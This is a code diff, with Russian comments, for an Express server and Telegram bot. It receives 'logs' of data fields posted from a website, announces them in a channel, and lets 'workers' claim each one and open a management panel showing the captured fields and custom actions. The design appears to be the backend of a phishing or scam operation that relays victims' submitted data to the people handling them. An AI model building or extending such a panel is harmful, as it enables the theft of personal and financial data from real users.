@@ -16,11 +16,11 @@ mongoose.connect(MONGO_URI)
     .then(() => console.log('✅ База данных подключена'))
     .catch(err => console.error('❌ Ошибка базы:', err));
 
-const WorkerSchema = new mongoose.Schema({
+const Worker = mongoose.model('Worker', new mongoose.Schema({
     workerId: String,      
+    workerName: String, // Добавили имя для отображения в канале
     targetUserId: String   
-});
-const Worker = mongoose.model('Worker', WorkerSchema);
+}));
 
 let userTasks = {}; 
 let logsStorage = {}; 
@@ -35,38 +35,26 @@ const cmdTexts = {
 
 const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
-app.get('/health', (req, res) => res.send('Бот активен'));
-
 // --- ПРИЕМ ЛОГА С САЙТА ---
 app.post('/api/log', async (req, res) => {
     const { userId, type, data } = req.body;
-    console.log(`Получен лог: тип=${type}, ID=${userId}`);
-
     logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };
 
-    // Ищем воркера в БАЗЕ по userId
+    // Проверяем, закреплен ли юзер за кем-то
     const connection = await Worker.findOne({ targetUserId: userId });
 
-    // --- ЛОГИКА ДЛЯ ПОВТОРЯЮЩЕГОСЯ ЛОГА ---
+    let channelMsg = '';
     if (connection) {
-        let repeatMsg = `<b>⚠️ ПОВТОРЯЮЩИЙСЯ ЛОГ [<code>${userId}</code>]</b>\n`;
-        repeatMsg += `<b>Тип:</b> ${safeText(type)}\n\n`;
-        
-        for (let key in data) { 
-            repeatMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; 
-        }
-        
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: connection.workerId,
-            text: repeatMsg,
-            parse_mode: 'HTML'
-        }).catch(e => console.log("Ошибка отправки повторного лога"));
-        
-        return res.json({ success: true });
-    } 
-
-    // Если воркера нет (новый лог) — шлем в канал
-    let channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n🆔 ID: <code>${safeText(userId)}</code>\n📍 Статус: 🔵 Ожидает воркера...`;
+        // Если лог ПОВТОРЯЮЩИЙСЯ
+        channelMsg = `<b>⚠️ ПОВТОРЯЮЩИЙСЯ ЛОГ [${safeText(type)}]</b>\n`;
+        channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
+        channelMsg += `📍 Закреплен за: <b>${connection.workerName || 'Воркером'}</b>`;
+    } else {
+        // Если лог НОВЫЙ
+        channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n`;
+        channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
+        channelMsg += `📍 Статус: 🔵 Ожидает воркера...`;
+    }
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         chat_id: CHANNEL_ID,
@@ -111,6 +99,7 @@ app.post('/tg-webhook', async (req, res) => {
 
         if (callback_query) {
             const workerId = callback_query.from.id;
+            const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
             const [action, userId, code] = callback_query.data.split('_');
 
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
@@ -118,18 +107,20 @@ app.post('/tg-webhook', async (req, res) => {
             }).catch(() => {});
 
             if (action === 'take') {
+                // Обновляем базу: записываем КТО взял этот лог
                 await Worker.findOneAndUpdate(
                     { workerId: workerId }, 
-                    { targetUserId: userId }, 
+                    { targetUserId: userId, workerName: workerName }, 
                     { upsert: true }
                 );
 
                 const log = logsStorage[userId];
                 let fullMsg = `<b>💎 УПРАВЛЕНИЕ ЛОГОМ</b>\n🆔 ID: <code>${userId}</code>\n\n`;
-                if (log) {
+                if (log && log.data) {
                     for (let key in log.data) { fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`; }
                 }
 
+                // Отправляем панель управления воркеру в ЛС
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: workerId,
                     text: fullMsg,
@@ -143,13 +134,13 @@ app.post('/tg-webhook', async (req, res) => {
                     }
                 });
                 
-                const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
+                // Изменяем текст в канале
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                     chat_id: CHANNEL_ID,
                     message_id: callback_query.message.message_id,
-                    text: `<b>🆕 ЛОГ</b>\n🆔 ID: <code>${userId}</code>\n📍 Взял: <b>${workerName}</b> ✅`,
+                    text: `<b>✅ ЛОГ ВЗЯТ</b>\n🆔 ID: <code>${userId}</code>\n📍 Воркер: <b>${workerName}</b>`,
                     parse_mode: 'HTML'
-                });
+                }).catch(() => {});
             }
 
             if (action === 'custom') {
